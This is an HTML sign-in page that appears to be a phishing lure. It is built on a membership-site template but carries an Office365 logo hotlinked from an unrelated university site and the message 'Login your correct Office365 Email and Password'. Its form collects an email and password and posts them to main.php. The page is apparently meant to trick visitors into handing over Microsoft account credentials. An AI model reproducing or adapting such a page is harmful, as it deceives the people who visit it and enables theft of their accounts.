<!DOCTYPE html>
<html lang="en">
<head>
		  <meta charset="ISO-8859-8">
		  <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

  <title>CD File-1</title>

  <link href='https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700,700italic' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
  <link rel="stylesheet" href="https://mdweb.mmsi2.com/spacecoastss/root/css/main.css">
  <link rel="stylesheet" href="https://mdweb.mmsi2.com/spacecoastss/root/css/client_branding.css">
		  <link rel="shortcut icon" href="https://mdweb.mmsi2.com/spacecoastss/root/assets/favicon.ico">
		  <link rel="apple-touch-icon" href="https://mdweb.mmsi2.com/spacecoastss/root/assets/favicon.ico" />

		<link rel="apple-touch-icon" href="https://mdweb.mmsi2.com/spacecoastss/root/assets/MD_icon.png">
		<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">


  <script src="//code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44="
    crossorigin="anonymous"></script>
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
  <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.5.7/angular.min.js" crossorigin="anonymous"></script>
  <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.5.7/angular-sanitize.js" crossorigin="anonymous"></script>
  <script src="./root/js/login.js?v=2019-07-11"></script>
</head>
<body>

  <!-- You write code for this content block in another file -->
  

<main class="login content" ng-app="loginApp" ng-controller="loginController">
  <input type="hidden" id="acct_name" name="acct_name" value="spacecoastss">
  <input type='hidden' id='acct_status' name='acct_status' value='LIVE'>
	<input type='hidden' id='host_name' name='host_name' value='mdweb'>
<div ng-show="loginForm">
  <form id="target" name="loginForm" method="post" action="main.php">
	<input type="hidden" name="location" value="MMSI">
	<input type="hidden" name="location" value="MMSI">
    <div class="form-group" style="padding: 20px 0px;">
      <img src="https://www.wcupa.edu/infoServices/workContinuity/images/office365.png" class="img-responsive" style="margin: 0 auto;" alt="Membership Director Logo" width="300" height="200" />
    </div>
    <div class="form-group" ng-class="{ 'has-error': loginForm.member.$dirty && loginForm.member.$error.required }">
      <label for="username">Email</label>
      <div class="input-group">
        <span class="input-group-addon">
          <span class="username-icon"></span>
        </span>
        <input type="text" id="username" class="form-control" name="member" placeholder="Email" ng-model="member" autofocus required>
      </div>
		<span ng-show="loginForm.member.$dirty && loginForm.member.$error.required" class="help-block">
		This field is required</span>
    </div>
		
		<div class="form-group" ng-class="{ 'has-error': loginForm.password.$dirty && loginForm.password.$error.required }">
		  <label class="sr-only" for="password">Password</label>
		  <div class="input-group">
			<span class="input-group-addon">
			  <span class="password-icon"></span>
			</span>
			<input type="password" id="password" class="form-control" name="password" placeholder="password" ng-model="password" required>
		  </div>
			<span ng-show="loginForm.password.$dirty && loginForm.password.$error.required" class="help-block">
			This field is required</span>
		</div>
	
	<div class="form-group" ng-show="message">
		<font color='red'>Login your correct Office365 Email and Password</font>
    </div>
	<input type='hidden' id='public' name='public' value='N'>
    <div class="form-group">
      <button type="submit" ng-disabled="loginForm.$invalid" class="green large" ng-click="processForm(); $event.preventDefault();">
		Sign In</button>
    </div>
  </form>
</div>

</main>